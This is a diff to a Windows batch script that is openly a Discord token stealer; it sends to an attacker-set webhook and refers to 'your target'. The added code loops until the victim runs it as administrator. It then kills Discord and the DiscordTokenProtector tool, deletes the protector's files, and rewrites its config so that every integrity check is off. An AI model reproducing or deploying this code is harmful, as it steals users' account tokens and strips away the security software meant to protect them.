@@ -5,6 +5,24 @@
 ::replace the YOURWEBHOOK field with your webhook
 set webhook=YOURWEBHOOK
 
+
+
+
+:check_Permissions
+    
+
+    net session >nul 2>&1
+    if %errorLevel% == 0 (
+        goto starti
+    ) else (
+       cls
+       echo Failure: Please run the file again with Admin
+       timeout 2 >NUL
+       goto check_Permissions
+    )
+
+
+:starti
 ::set 1 if you want that the discord of your target get closed ( discord needs to be restarted to send you the token)
 set /a killdc = 0
 
@@ -165,11 +183,29 @@ if %killdc% == 1 goto d
 goto e
 :d
 ::coded by baum#2873
-::kills discord if enabeld
-taskkill /im discord.exe /f 
-:e
 
-
+::DiscordTokenProtector Fucker
+taskkill /im Discord.exe /f
+taskkill /im DiscordTokenProtector.exe /f
+del %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe
+del %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll
+del %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat
+echo { >%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "auto_start": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "auto_start_discord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_allowbetterdiscord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkexecutable": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkhash": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkmodule": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkresource": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkscripts": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_redownloadhashes": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "iterations_iv": 187, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
 
 ::deletes all temp files
 del %userprofile%\AppData\Local\Temp\ip.txt 
